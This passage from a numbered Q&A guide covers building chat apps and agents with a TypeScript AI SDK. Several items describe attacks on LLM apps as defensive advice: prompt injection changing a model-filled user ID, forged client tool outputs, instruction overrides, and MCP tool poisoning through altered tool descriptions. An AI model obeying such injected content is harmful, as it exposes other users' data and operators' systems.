If the user ID is a tool argument, the model fills it, and a prompt injection or a curious user ("show me orders for user 42") can change it. With `contextSchema` and `toolsContext`, your server sets the user ID from the session, and the model never sees or controls it.

The general rule: authorization data comes from your server, never from model arguments.

## 320: What can go wrong if you trust tool outputs sent by the client?

With client-side tools, the client sends the tool output. A malicious client can send any output, or add fake tool parts for server tools in the message history it sends. If the server trusts that history, the model acts on fake data.

Protect against it by loading history from your database instead of the request (send only the new message), validating messages with `validateUIMessages`, and never treating client tool outputs as proof of anything security related.

## 321: How do you protect against runaway costs from one user?

Combine several limits:

- Per-user rate limits and daily token budgets checked before each call.
- `maxOutputTokens` and `stopWhen` with both a step limit and a custom token limit.
- Timeouts (`totalMs`) on long calls.
- AI Gateway spend limits as a last safety net.
- Logging usage per user from `onEnd` so you can see abuse quickly.

## 322: How do you use different API keys for different customers?

Create a provider instance per request with the customer's key. Provider instances are cheap, so this is fine.

```ts
import { createOpenAI } from "@ai-sdk/openai";

export async function POST(req: Request) {
  const tenant = await getTenant(req);
  const openai = createOpenAI({
    apiKey: await secrets.get(tenant.openaiKeyRef),
  });

  const result = streamText({ model: openai("gpt-5.5"), prompt: "..." });
  // ...
}
```

Never cache instances in a way that could mix tenants, and never log the keys.

## 323: What is WorkflowAgent and when do you need it?

`WorkflowAgent` from `@ai-sdk/workflow` runs the same agent loop as `ToolLoopAgent`, but inside a durable workflow. Each tool execution is a workflow step with automatic retries, and the agent's state is persisted. If the process crashes or a deploy happens, the run resumes from the last finished step.

Use it for long-running agents, agents that wait for human approval for hours, or anything where losing progress is expensive. For short chat requests, `ToolLoopAgent` is simpler.

## 324: What is a harness in AI SDK 7?

A harness is a full agent runtime, like Claude Code, Codex or Pi, with its own built-in tools, session state, context compaction and permission rules. AI SDK 7 adds `HarnessAgent` (from `@ai-sdk/harness/agent`) with adapter packages like `@ai-sdk/harness-claude-code`, so you can run these runtimes through the same agent interface as your own agents.

```ts
import { HarnessAgent } from "@ai-sdk/harness/agent";
import { claudeCode } from "@ai-sdk/harness-claude-code";

const agent = new HarnessAgent({
  harness: claudeCode,
  model: "claude-sonnet-4-6",
  instructions: "You are a careful coding assistant.",
});
```

Harness output is mapped to AI SDK stream types, so you can render it with `useChat`. Harness packages are experimental.

## 325: When would you pick a harness over a ToolLoopAgent?

Pick a harness when you want an existing, well-tested agent (usually a coding agent) to do the work in a sandboxed workspace, with its native tools and session handling. Pick `ToolLoopAgent` when you want full control over the model call, the tools, the loop and structured output, or when the task isn't a fit for those runtimes.

A harness saves you from rebuilding a coding agent, but you accept its behavior and its limits.

## 326: What is a sandbox session in the AI SDK?

Some features (harnesses, code execution tools) need an isolated environment to run commands and edit files. The AI SDK has a sandbox session interface that tools receive as `experimental_sandbox` in their execute options, with adapters like `@ai-sdk/sandbox-vercel`. A session can run processes, read and write files, and is destroyed when the work is done.

Running agent-generated commands outside a sandbox is risky, because the model can be tricked into running harmful commands.

## 327: What is steering?

Steering lets you send a new user message to an agent while it is still running. You create a steering object with `experimental_createSteering()`, pass it as `experimental_steering`, and call `steer()` when the user types something. The message is added before the next step, so the agent can change direction without starting over.

```ts
const steering = experimental_createSteering();

const result = streamText({
  model,
  tools,
  prompt: "What is the weather in Paris?",
  experimental_steering: steering,
});

// user adds a correction while it runs
await steering.steer("I meant Paris, Texas.");
```

`steering.queue()` instead adds a follow-up that waits until the current task is done.

## 328: What is experimental_decide?

`experimental_decide` asks a decision model to answer named questions about one shared state (a string, a JSON object, or a list of parts). It's meant for structured judgments, like "is this ticket urgent?" and "which team owns it?", answered together. It is experimental and the decision model spec may change even in patch releases.

## 329: What is MCP Apps support?

MCP Apps let an MCP tool point to a `ui://` resource that contains HTML. The host app shows that HTML in a sandboxed iframe and passes messages between the app and the MCP server. The AI SDK has helpers in `@ai-sdk/mcp` (to advertise support, split model-visible and app-visible tools, and read UI resources) and a React renderer component in `@ai-sdk/react`.

This lets a third-party MCP server provide its own interactive UI inside your chat.

## 330: How does telemetry work internally in AI SDK 7?

You register one or more telemetry integrations with `registerTelemetry`. The SDK then reports events (call start, step start, model call, tool execution, step end, call end) to all registered integrations. The OpenTelemetry integration turns them into spans like `ai.generateText`, `ai.generateText.doGenerate` and `ai.toolCall`. DevTools uses the same mechanism.

The SDK also publishes events on a Node.js diagnostics tracing channel (`AI_SDK_TELEMETRY_TRACING_CHANNEL`), so tools can listen without changing your code.

## 331: What spans does the OpenTelemetry integration create for a call with tools?

For `generateText` you get a top span `ai.generateText`, a child `ai.generateText.doGenerate` for each model request, and an `ai.toolCall` span for each tool execution, with attributes like the tool name and id. `streamText` produces `ai.streamText` and `ai.streamText.doStream`. Spans carry the model, provider, token usage, finish reason, and (if recording is on) prompts and outputs.

This tree makes it easy to see where time goes: model latency, slow tools, or too many steps.

## 332: How does the SDK retry failed calls?

For retryable errors (like 429, 5xx and network errors), it retries up to `maxRetries` times with exponential backoff, starting around 2 seconds and doubling. If the provider sends a `retry-after` or `retry-after-ms` header, the SDK uses that delay when it's reasonable. Non-retryable errors like 400 or 401 fail at once.

After the last attempt it throws `RetryError` with all the errors, which helps you tell "the provider was down" from "my request is wrong".

## 333: How do the different timeout settings interact?

- `totalMs` limits the whole call.
- `stepMs` limits each step, including retries and local tool execution.
- `firstChunkMs` (streaming) limits the wait for the first real output of each step.
- `chunkMs` (streaming) limits the gap between output chunks, which catches stalled streams.
- `toolMs` and `tools.<name>Ms` limit tool runs. A tool timeout becomes a tool error so the model can react.

They can all be combined with `abortSignal`. Whichever fires first wins.

## 334: What happens to already-streamed text when a stream retry happens?

With `streamRetries`, if the stream breaks in the middle, the SDK retries the step. Consumers have already seen the earlier text, so it stays in the stream, and the SDK sends a `reset-step` part to signal the retry. The broken attempt is left out of the step result, structured output parsing and the messages for the next step.

A UI that cares should handle `reset-step`, for example by clearing the partial text of that step.

## 335: How should tools handle being called more than once for the same action?

Retries, resumed workflows and repeated model calls can run a tool more than once. For tools with side effects (payments, emails, bookings), make them idempotent: use the `toolCallId` or your own key to detect a repeat and return the earlier result instead of doing the action again.

Read-only tools usually don't need this.

## 336: What are the risks of parallel tool execution?

When the model calls several tools in one step, they run at the same time. If they share state (the same file, a database row, a shopping cart), you can get race conditions. Tool context is shared too, so tools must not change it.

Set `toolCallConcurrency: 1` when order matters, make tools independent, or use locks in your data layer. Change shared context in `prepareStep`, between steps, not inside tools.

## 337: How do you design a customer support chatbot with the AI SDK?

A reasonable design:

- Front end: `useChat` with typed messages, tool parts rendered as cards, `sendAutomaticallyWhen` for approvals.
- API route: auth, rate limit, load history from the database, `streamText` or a `ToolLoopAgent`.
- Tools: `searchHelpArticles` (RAG), `getOrder` and `getAccount` with `toolsContext` for the user ID, `createRefund` behind `toolApproval: 'user-approval'`, and `handoffToHuman`.
- Instructions: tone, scope, when to hand off.
- Persistence: save UI messages in `onEnd`, consume the stream so saving always happens.
- Observability: telemetry with `functionId`, usage logs, evals on real transcripts.

## 338: How would you design RAG over millions of documents?

Embedding and search must scale separately from the chat:

- Ingestion as a background pipeline: chunk, `embedMany` with `maxParallelCalls`, store in a vector database with metadata (tenant, source, date).
- Hybrid search: vector search plus keyword search, filtered by metadata, then `rerank` the top results.
- Give the model a search tool so it can refine queries, or pre-fetch for simple Q&A.
- Return short chunks with source IDs so the answer can cite them.
- Re-embed when you change embedding models, since vectors from different models don't mix.

## 339: A chat stream works locally but stops after 10 seconds in production. What do you check?

Most likely the platform's function time limit. Check the route's `maxDuration` (on Vercel) or your host's timeout. Also check proxies or load balancers with idle timeouts, which close the connection when no data flows for a while, for example during a long tool call.

Fixes: raise the limit, keep the connection busy (the UI stream helpers support keep-alive pings with `keepAliveMs`), move long work to a background workflow, or make tools faster.

## 340: useChat shows the user message but no answer. What are common causes?

- The route returns the wrong format, for example a text stream while `useChat` expects a UI message stream.
- The route throws before streaming. Check the server logs and the network tab.
- `convertToModelMessages` was not awaited.
- A proxy or middleware buffers or breaks the SSE response.
- The error is hidden: check `error` from `useChat` and add `onError` on the server.

Opening the network tab and looking at the raw response usually shows which one it is.

## 341: An agent keeps calling the same tool over and over. How do you fix it?

Look at the steps to see why. Common causes: the tool returns an error or an empty result the model doesn't understand, the description doesn't say what the result means, or the model has no clear "done" signal.

Fixes: return clear results (including "no results found"), improve the description, add a `hasToolCall('finalAnswer')` stop condition, cap steps, and use `prepareStep` to remove a tool from `activeTools` after it was called a few times.

## 342: How do you migrate an AI SDK 4 app to AI SDK 7?

Go one major version at a time and run the codemod for each (`npx @ai-sdk/codemod v5`, then `v6`, then `v7`). The biggest changes:

- v5: messages became `UIMessage` with parts, `useChat` lost input management, transports were added, `maxSteps` became `stopWhen`, `parameters` became `inputSchema`.
- v6: `ToolLoopAgent`, `generateObject` deprecated in favor of `output`, async `convertToModelMessages`, usage details moved.
- v7: `instructions`, `onEnd` and `onStepEnd`, `stream` instead of `fullStream`, standalone response helpers, `toolApproval`, Node 22 and ESM only.

Saved messages from v4 need a data migration to the parts format.

## 343: How do you reduce time to first token?

- Stream the response.
- Use a smaller or faster model for simple requests, and route harder ones to a bigger model.
- Use prompt caching so long, stable prefixes are cheaper and faster.
- Keep reasoning low (`reasoning: 'low'` or `'none'`) when the task doesn't need it.
- Avoid slow work before the model call. Start the stream and do the extra work in a tool or in parallel.
- Choose a provider region close to your server.

## 344: How do you compare two models for your use case?

Build an eval set from real inputs, run both models with the same prompts through the same code (easy with the AI SDK, since only the model changes), and score with checks or an LLM judge. Also compare cost (from `usage`), latency, and failure rates (tool errors, schema errors).

In production you can also split traffic between models and compare user signals, as long as you log which model answered.

## 345: How do you handle personal data in prompts?

- Send only the data the task needs.
- Remove or mask sensitive values with middleware before the request.
- Turn off `recordInputs` and `recordOutputs` in telemetry, or scrub spans.
- Use providers and settings with zero data retention or no-training terms where required.
- Keep data in the right region if you have residency rules.
- Don't put personal data in shared caches.

## 346: How do you test an agent end to end without a real model?

Use `MockLanguageModelV4` with a `doGenerate` (or `doStream`) that returns different responses per call: first a tool call, then a final text after seeing the tool result. Then assert on the steps, the tool inputs and the final text.

```ts
let call = 0;
const model = new MockLanguageModelV4({
  doGenerate: async () => {
    call++;
    return call === 1
      ? {
          content: [
            {
              type: "tool-call",
              toolCallId: "1",
              toolName: "getOrder",
              input: '{"orderId":"123"}',
            },
          ],
          finishReason: { unified: "tool-calls", raw: "tool_calls" },
          usage,
          warnings: [],
        }
      : {
          content: [{ type: "text", text: "Your order shipped." }],
          finishReason: { unified: "stop", raw: "stop" },
          usage,
          warnings: [],
        };
  },
});
```

This tests your loop, tools and stop conditions in a fast, repeatable way.

## 347: What is the type inference chain from tools to UI parts?

You define tools with `tool()`, which carries input and output types from the schemas and `execute`. `InferUITools<typeof tools>` maps each tool to its UI input and output types. You put that in `UIMessage<Metadata, DataParts, Tools>`, and `useChat<MyMessage>()` then narrows `part.type === 'tool-getWeather'` to the right `input` and `output`.

`InferAgentUIMessage<typeof agent>` does all of this from an agent. If you skip these types, parts fall back to `unknown`, which hides bugs.

## 348: How would you write a custom chat transport?

Implement the `ChatTransport` interface: `sendMessages` (send messages and return a stream of UI message chunks) and `reconnectToStream` (return the active stream for resume, or `null`). Inside, you can use any protocol: WebSocket, a message queue, or a direct function call.

The rest of `useChat` doesn't change, because it only needs a stream of chunks. That's how `DirectChatTransport` and `WebSocketChatTransport` work.

## 349: What doesn't work in edge runtimes?

Edge runtimes have no Node.js built-ins. So stdio MCP transports (they start child processes), `pipeUIMessageStreamToResponse` (it needs a Node response), file system access in tools, and some provider auth helpers (like AWS credential chains) won't work there. Edge runtimes also have smaller memory and CPU limits.

Use the Node.js runtime for routes that need these, and keep edge for simple streaming endpoints.

## 350: How do you handle large files in chat apps?

Don't send big files inline in every request. Upload them to storage (or a provider's files API with `uploadFile`) and reference them by URL or provider reference. Check file size and type on the server. Remember that file content stays in the history and is sent again on every turn, so for long documents a RAG approach is often cheaper than attaching the whole file each time.

## 351: How would you design a coding agent with the AI SDK?

Start with `ToolLoopAgent` and tools like `readFile`, `listFiles`, `searchCode`, `writeFile` and `runCommand`, all running inside a sandbox session, never on your own server. Put `writeFile` and `runCommand` behind `toolApproval` (or a policy function that approves safe commands). Use `prepareStep` to trim old file contents from history, and a high step limit with a token budget stop condition.

If you'd rather not build all this, a harness (`HarnessAgent` with a Claude Code or Codex adapter) gives you a ready coding agent in the same interface.

## 352: How do you make agent runs survive server restarts?

An in-memory `ToolLoopAgent` loses its progress if the process stops. Options:

- `WorkflowAgent`, which saves state after each step and resumes.
- Save `responseMessages` after each step (in `onStepEnd`) and restart from the saved messages if a run dies.
- Run agents in a job queue with retries, not inside HTTP requests.

Pair this with idempotent tools, because a resumed run may repeat the last tool call.

## 353: How does human-in-the-loop work with a durable agent?

With a normal agent, an approval request ends the HTTP request, and the next request continues with the approval in the messages. With a durable workflow, the agent can pause at the approval, store its state, and wait hours or days for a response (for example from an email link or a Slack button), then resume exactly where it stopped.

## 354: What is the policy-based approval package?

`@ai-sdk/policy-opa` lets you write tool approval rules in Open Policy Agent (Rego) instead of in TypeScript. It plugs into the normal `toolApproval` callback. This lets security teams review and test rules separately (`opa test` in CI) and change them without a code deploy.

It uses the same approval request and response flow as built-in approvals.

## 355: How do you add an agent to Slack or Teams?

Vercel's Chat SDK handles the chat platform side (Slack, Teams, Discord, Telegram and more) and works with the AI SDK. You convert the thread to `ModelMessage[]` with its helpers, run your `ToolLoopAgent`, and post the streamed reply back into the thread. Your agent code stays the same for all platforms.

## 356: How do you run an agent in the terminal for local testing?

`@ai-sdk/tui` gives you a ready terminal chat UI for a local `ToolLoopAgent`, or for a remote agent through a chat transport. It shows streamed answers, markdown, tool cards, reasoning and approval prompts, so you can try an agent without building a web UI.

## 357: How would you add per-tenant model routing?

Put routing in one place, for example a function that returns a model based on tenant settings, or a `customProvider` built per tenant. Use `runtimeContext` to pass tenant info, and `prepareStep` to pick the model per step if needed.

```ts
const result = streamText({
  model: modelFor(tenant),
  runtimeContext: { tenantId: tenant.id },
  prepareStep: ({ runtimeContext, stepNumber }) =>
    stepNumber > 0 && tenantIsBudgetLimited(runtimeContext.tenantId)
      ? { model: "openai/gpt-5.4-mini" }
      : undefined,
  messages,
});
```

## 358: What are the trade-offs of the AI Gateway?

Good: one key and one bill for many providers, easy model switching, fallbacks, spend limits, usage dashboards, and OIDC auth on Vercel.

Costs: another service in the path (latency and availability), possible lag in supporting brand-new provider features, and your data passing through Vercel, which may matter for compliance. Many teams use the gateway by default and call a provider directly for special cases.

## 359: How do you route only the expensive requests to a bigger model?

Use a cheap model, or simple rules, to classify the request first, then pick the model. With the AI SDK this is a small `generateText` call with `Output.choice`.

```ts
const { output: level } = await generateText({
  model: "openai/gpt-5.4-nano",
  output: Output.choice({ options: ["simple", "complex"] }),
  prompt: `Is this request simple or complex?\n${userMessage}`,
});

const model = level === "complex" ? "openai/gpt-5.5" : "openai/gpt-5.4-mini";
```

Measure whether the extra call pays for itself. For short chats it may not.

## 360: How do you debug wrong structured output?

Catch `NoObjectGeneratedError` and log `error.text` (what the model returned), `error.cause` (the parse or validation error) and `error.finishReason`. A `length` finish reason means the output was cut off. A validation error tells you which field is wrong.

Then make fields clearer with `.describe()`, simplify the schema, raise `maxOutputTokens`, or use a model with native JSON schema support.

## 361: What is repairText?

`repairText` is an option of the deprecated `generateObject` and `streamObject` functions. When the model's JSON fails to parse or validate, the SDK calls it with the raw text and the error, and you can return fixed text (for example with a closed bracket or removed extra text) for another try. It used to be called `experimental_repairText`.

With `generateText` and `output` there is no such option, so you catch `NoObjectGeneratedError` and repair `error.text` yourself, or retry the call. Repairing helps with small format problems, but if the content is wrong, a better prompt or model is the real fix.

## 362: How do you keep tool definitions in sync between server and client types?

Define tools in a shared module that both the API route and the client types import. The client only imports types (`import type`), so no server code ends up in the bundle.

```ts
// tools.ts (server)
export const tools = { getWeather, getOrder };

// types.ts
import type { InferUITools, UIMessage, UIDataTypes } from "ai";
import type { tools } from "./tools";
export type ChatMessage = UIMessage<
  never,
  UIDataTypes,
  InferUITools<typeof tools>
>;
```

## 363: How do you build a chat with branching (editing old messages)?

Store messages as a tree: each message has a parent ID. When the user edits a message, create a new branch from its parent. The active branch is a path from the root to a leaf, and that path is what you send to `useChat` and the model. `sendMessage` with `messageId` handles the simple case of replacing a message in a linear chat.

## 364: How do you stream reasoning and text from models that mix them in one output?

Some open models write `<think>...</think>` followed by the answer. Use `extractReasoningMiddleware({ tagName: 'think' })`, which splits it into reasoning and text parts, even while streaming. For models with native reasoning output, the provider already sends separate reasoning parts.

## 365: Why might a model ignore temperature or other settings?

Some models, especially reasoning models, don't support sampling settings like `temperature` and `topP`. The provider package removes them and adds a warning. Check `result.warnings` or the console logs when a setting seems to have no effect.

## 366: How do you limit how much reasoning text you store and resend?

Reasoning can be large. Use `pruneMessages({ reasoning: 'before-last-message' })` before sending history back to the model. Some providers need reasoning from the current turn to continue tool loops correctly, so prune old turns, not the current one.

For storage, decide if you need reasoning at all. You can hide it from the client with `sendReasoning: false`.

## 367: What is the difference between finishReason and rawFinishReason?

`finishReason` is the SDK's common value (`stop`, `length`, `tool-calls`, `content-filter`, `error`, `other`). `rawFinishReason` is the exact value the provider sent, like `end_turn` or `max_tokens`. Use `finishReason` for logic and `rawFinishReason` for debugging provider-specific behavior.

## 368: How do you guard against a model calling a tool with valid but dangerous input?

Schema validation only checks the shape, not the meaning. Add checks inside `execute` (allowlists, limits, ownership checks), use `toolApproval` with a function that inspects the input, and give tools the smallest permissions they need. For example, a file tool should only access a specific folder, no matter what path the model sends.

## 369: How do you stop users from overriding your instructions?

You can't fully prevent it, because the model reads user text and instructions together. You can reduce the impact:

- Keep secrets out of the prompt entirely.
- Don't rely on instructions for security. Enforce rules in tools and on the server.
- Use AI SDK 7's default of rejecting system messages in `messages`.
- Check outputs for things that must never appear.
- Use a separate moderation or classification call for risky apps.

## 370: How do you run the same prompt across several providers at once?

Call them in parallel with `Promise.all`, each with its own model. Because the API is the same, the code is short.

```ts
const models = [
  "openai/gpt-5.5",
  "anthropic/claude-sonnet-5.5",
  "google/gemini-3.5-flash",
];

const results = await Promise.all(
  models.map((model) => generateText({ model, prompt })),
);
```

This is useful for evals, or for "best of N" answers where another call picks the best one.

## 371: How do you implement a fallback across providers without the gateway?

Write a small wrapper (or middleware) that tries models in order and moves on when an error is retryable or the provider is down.

```ts
async function generateWithFallback(
  options: Omit<Parameters<typeof generateText>[0], "model">,
  models: LanguageModel[],
) {
  let lastError: unknown;
  for (const model of models) {
    try {
      return await generateText({ ...options, model, maxRetries: 1 });
    } catch (error) {
      lastError = error;
      if (APICallError.isInstance(error) && !error.isRetryable) throw error;
    }
  }
  throw lastError;
}
```

Streaming fallbacks are harder, because you can only switch before the first chunk reaches the user.

## 372: Why do provider differences still matter with a unified API?

The API is the same, but models differ in context size, tool calling quality, JSON schema support, supported file types, reasoning, caching rules and rate limits. A prompt tuned for one model can work badly on another.

So switching models is a one-line code change, but it still needs testing, ideally with evals.

## 373: How would you add content moderation to a chat?

Check the user message before calling the main model, with a moderation API or a small classifier call, and refuse if needed. For outputs, check after generation, or during streaming at chunk boundaries if the risk is high. Middleware is a good place for this, so every route gets it.

Remember that moderation adds latency, so run it in parallel with the main call when you can and cancel the main call if moderation fails.

## 374: How can moderation run in parallel with the main call?

Start both at the same time and abort the main stream if moderation flags the input.

```ts
const controller = new AbortController();

const result = streamText({ model, messages, abortSignal: controller.signal });

moderate(lastUserMessage).then((flagged) => {
  if (flagged) controller.abort();
});

return createUIMessageStreamResponse({
  stream: toUIMessageStream({ stream: result.stream }),
});
```

The user may see a few tokens before the abort, so this suits low-risk apps better than high-risk ones.

## 375: How do you test streaming UI components?

Test the UI against a fake stream instead of a real API. You can mock `fetch` to return a UI message stream response built from fixed chunks, or use a custom transport in tests that returns a `ReadableStream` of chunks. Then assert that messages, tool cards and statuses render as expected at each stage.

## 376: What does keepAliveMs do on UI stream responses?

It makes the server send small ping chunks while nothing else is being sent, for example during a slow tool call. This keeps proxies and load balancers from closing an "idle" connection.

```ts
createUIMessageStreamResponse({ stream, keepAliveMs: 15_000 });
```

## 377: What is consumeSseStream used for?

`consumeSseStream` on the response helpers gives you a copy of the SSE stream that is sent to the client. It's used for resumable streams: you pass that copy to a store like `resumable-stream`, which saves it in Redis so a reconnecting client can replay it.

## 378: How does stream resume work under the hood?

When the server starts a response, it saves the stream (through `consumeSseStream`) under a stream ID and records that ID as the chat's active stream. When the client reconnects with `resume: true`, `useChat` calls the transport's `reconnectToStream`, which hits a GET endpoint. The endpoint looks up the active stream ID and returns a stream that replays saved chunks and then continues live. When the answer finishes, you clear the active stream ID.

## 379: How do you keep conversation history in sync between tabs?

Each tab has its own `useChat` state. To sync, save messages on the server in `onEnd`, and refresh other tabs through your own channel (polling, a WebSocket, or a `BroadcastChannel` in the browser) by calling `setMessages` with the latest saved messages. Resumable streams can also let a second tab watch an answer that is still streaming.

## 380: How would you implement "regenerate with a different model"?

Send the chosen model in the request body with `regenerate`, and on the server pick that model. Store the model in message metadata so the UI shows which model wrote each answer.

```tsx
regenerate({ body: { model: "anthropic/claude-sonnet-5.5" } });
```

## 381: What should you log for each AI request in production?

At least: a request ID, user or tenant, model and provider, `functionId`, token usage (input, output, cached, reasoning), latency (first token and total), finish reason, number of steps, tool names and errors, and warnings. Avoid logging full prompts unless you have a clear reason and permission.

`onEnd`, `onStepEnd` and telemetry give you all of these without changing your main code.

## 382: How do you calculate cost per request?

Multiply token counts by the model's prices: input tokens (minus cached tokens) at the input price, cached reads at the cache price, cache writes at the write price if any, and output tokens (including reasoning) at the output price. Sum across steps, which `result.usage` already does in AI SDK 7.

Prices change and differ by provider, so keep them in config, not in code. The AI Gateway can also report spend for you.

## 383: How do you handle a provider returning content-filter?

`finishReason: 'content-filter'` means the provider blocked the output (or part of it). Don't show a half answer as if it were complete. Show a clear message, log the event, and decide whether to retry with a different prompt or model. Repeated filtering may mean your instructions or users push into topics the provider blocks.

## 384: What happens if a user closes the tab during a tool approval?

The approval request is in the saved messages (if you saved them in `onEnd`), with the tool part in the `approval-requested` state. When the user comes back and loads the chat, the UI can show the pending approval again, and answering it continues the run.

With a durable workflow agent, the run itself waits on the server for the response.

## 385: Why might tool calls fail only with some providers?

Providers differ in how they support JSON Schema in tool definitions. Some don't accept certain keywords (like `oneOf`, formats or very deep nesting), some need all fields required in strict mode, and some have limits on tool name characters or count. Check the warnings and the provider docs, and keep tool schemas simple and flat.

## 386: How do you give a model many similar tools without confusing it?

Too many similar tools lower accuracy. Options: merge them into one tool with an `action` enum, use `activeTools` to show only relevant ones per step, use tool search with `deferLoading`, or split the work across sub-agents with smaller tool sets. Clear, distinct descriptions help most.

## 387: What does dynamic tool description do?

A tool's `description` can be a function that receives the tool `context` (and sandbox). It returns the description for that call. This lets you tailor descriptions, for example listing only the projects the current user can access, without creating new tools per user.

```ts
const openProject = tool({
  contextSchema: z.object({ projects: z.array(z.string()) }),
  description: ({ context }) =>
    `Open a project. Available: ${context.projects.join(", ")}`,
  inputSchema: z.object({ name: z.string() }),
  execute: async ({ name }) => open(name),
});
```

## 388: How do you keep a long-running agent focused?

- Give it a plan step first (a `makePlan` tool or structured output) and keep the plan in context.
- Use `prepareStep` to remind it of the goal, trim noise, and change `activeTools` by phase.
- Use sub-agents for side tasks so the main context stays small.
- Use steering to correct it while it runs.
- Stop with clear conditions instead of hoping it finishes.

## 389: How do you summarize a conversation without losing important tool results?

Summarize old turns but keep key facts as structured data. For example, run `generateText` with `Output.object` to extract decisions, IDs and open tasks, and store them. Then send the structured summary plus the recent messages. This keeps exact values (order numbers, dates) that a free-text summary might change.

## 390: Why would you put a hard step limit even with hasToolCall?

`hasToolCall('done')` only stops if the model calls `done`. If it never does (a loop, confusion, or an injection), the run continues and costs money. Always combine it with `isStepCount(n)` and maybe a token or time limit, so there is always a hard ceiling.

## 391: What can go wrong when you run an agent inside a tool of another agent?

- Costs add up quickly and usage of the inner agent isn't in the outer `usage` unless you add it.
- Errors in the inner agent must be turned into clear tool results.
- Aborts must be passed down with `abortSignal`, or the inner agent keeps running.
- The inner agent's full output can flood the outer context, so use `toModelOutput` to return a short result.
- Telemetry should link the inner and outer spans so you can trace it.

## 392: How do you pass the abort signal from the user to nested tools and agents?

The tool's execute options include `abortSignal`. Pass it to every `fetch`, database call, or inner `generateText`/agent call inside the tool. That way one stop click cancels the whole tree of work.

```ts
execute: async ({ query }, { abortSignal }) => {
  const { text } = await innerAgent.generate({ prompt: query, abortSignal });
  return text;
},
```

## 393: How do you serve one agent to web, Slack and an API?

Define the agent once (`ToolLoopAgent` in its own module). Each surface is a thin adapter: a Next.js route with `createAgentUIStreamResponse`, a Chat SDK handler for Slack, and a JSON API that calls `agent.generate`. Use call options and `runtimeContext` for surface-specific details, like the user identity or formatting rules.

## 394: How do you handle streaming in a React Native app?

React Native's fetch doesn't support streaming response bodies in all setups. You need a fetch implementation that supports streams (for example the one from Expo), and you pass it to the transport through its `fetch` option. Then `useChat` from `@ai-sdk/react` works mostly the same as on the web. The API route must use a full URL, since there is no relative `/api` path in a native app.

## 395: How do you prevent a slow tool from blocking the whole answer?

Set a per-tool timeout (`timeout.tools.<name>Ms` or `toolMs`), so the tool fails with an error the model can handle. Show progress with preliminary results from an async generator. For very slow jobs, have the tool start a background job and return a job ID, and add another tool to check the result later.

## 396: What happens to usage when a call is aborted?

Steps that finished before the abort have their usage recorded. The step that was running when the abort happened may not report full usage, because the provider never sent its final usage chunk, even though you may still be billed for tokens it generated. So cost tracking based only on `usage` can slightly undercount aborted calls.

## 397: How do you build a "deep research" feature?

A typical design: a planner step creates search questions with structured output, a search tool (or sub-agents in parallel) collects sources, a reader step extracts facts with citations, and a writer step produces the report. Use a durable workflow for long runs, preliminary tool results or data parts for progress, `rerank` to pick the best sources, and strict step and token limits.

## 398: How do you avoid sending the same large instructions on every request?

You can't skip sending them, because the model has no memory, but you can make them cheap: use prompt caching (automatic on some providers, `cacheControl` on Anthropic), keep them at the very start and unchanged, and move rarely needed details into tools or documents the model fetches only when needed.

## 399: What does the Agent interface allow you to do?

`Agent` is an interface with `generate` and `stream` methods (plus `id`, `tools` and a version). `ToolLoopAgent`, `WorkflowAgent` and `HarnessAgent` all implement it. Helpers like `createAgentUIStreamResponse` and `DirectChatTransport` accept any `Agent`, so you can swap the agent type without changing the route or UI. You can also write your own agent class with custom control flow that still fits these helpers.

## 400: How would you write your own agent class?

Implement the `Agent` interface: `generate` and `stream` that take a prompt or messages and return results shaped like `generateText` and `streamText` results. Inside you can call `generateText` or `streamText` in any pattern: a planner-executor loop, a router to specialist models, or a fixed workflow.

Most of the time, a `ToolLoopAgent` with `prepareStep` is enough. Write your own only when the loop itself must be different.

## 401: What is MCP tool drift and how do you detect it?

An MCP server controls its tool descriptions and schemas, and it can change them after you reviewed them. A changed description can carry a prompt injection, and a widened schema can allow new inputs. This is sometimes called a "rug pull".

AI SDK 7 has `fingerprintTools` and `detectToolDrift`. You fingerprint the tools when you first review and trust the server, store the result, and compare on every later connection.

```ts
import { detectToolDrift, fingerprintTools } from "ai";

const tools = await mcpClient.tools();
const drift = detectToolDrift(await fingerprintTools(tools), storedBaseline);

if (drift.changed.length || drift.added.length) {
  throw new Error("MCP tools changed, review them before use");
}
```

It can't detect changes in what the server does behind the same definition.

## 402: What security risks come with connecting to third-party MCP servers?

- Tool descriptions are sent to the model as instructions, so a malicious server can inject prompts ("tool poisoning").
- Tool results are untrusted content that can carry indirect injections.
- Tools may do more than their description says.
- OAuth tokens and data you send to tools go to the server's owner.

Only connect to servers you trust, require approval for MCP tools that change things, watch for drift, and don't combine untrusted MCP tools with tools that access sensitive data in the same agent.

## 403: Where can you set providerOptions?

At several levels: on the whole call, on a single message, on a message part (like one text or file part), on a tool, and on system messages in `instructions`. More specific levels are used for things like marking one part for caching.

```ts
{
  type: 'file',
  data: pdfBytes,
  mediaType: 'application/pdf',
  providerOptions: { anthropic: { cacheControl: { type: 'ephemeral' } } },
}
```

## 404: How is a string model ID resolved?

When `model` is a string, the SDK uses the global default provider (`globalThis.AI_SDK_DEFAULT_PROVIDER`). If you didn't set one, that's the AI Gateway, which expects `provider/model` IDs. With a provider registry you resolve strings yourself with `registry.languageModel('openai:gpt-5.5')`, which uses the registry's separator.

This means the same string can mean different things in different apps, so be explicit about which provider is the default.

## 405: How do you upgrade to a new model version without changing code everywhere?

Use aliases. Define names like `chat-default` or `summarizer` in a `customProvider` or registry, and point them to real model IDs in one config file. To upgrade, change the mapping, run your evals, and deploy. You can even roll out gradually by picking the model per user in that one place.

## 406: How does TypeScript infer the output type of generateText?

`generateText` is generic over the tools, the runtime context and the output spec. `Output.object({ schema })` returns an `Output` typed by the schema, and `result.output` uses that type. Tools work the same way: the `tools` object type flows into `toolCalls`, `toolResults` and `steps`, so `toolCall.input` is narrowed by `toolName`.

That's why defining tools inline or with `tool()` matters: a plain object with a wide type loses this inference.

## 407: What is FlexibleSchema?

`FlexibleSchema` is the type the SDK accepts anywhere a schema is expected. It can be a Zod schema, any Standard Schema object (Valibot, ArkType and others), or a `Schema` created with `jsonSchema()`. Internally, `asSchema` turns any of them into a common form with a JSON Schema and a validate function.

So your library choice doesn't change how you use tools or structured output.

## 408: When would you use zodSchema explicitly?

You can pass Zod schemas directly. `zodSchema()` is useful when you need options, mainly `useReferences: true` for recursive schemas (built with `z.lazy`), which need JSON Schema references. Not all providers accept references, so test before relying on them.

```ts
import { zodSchema } from "ai";

const treeSchema = zodSchema(nodeSchema, { useReferences: true });
```

## 409: Which Zod versions does AI SDK 7 support?

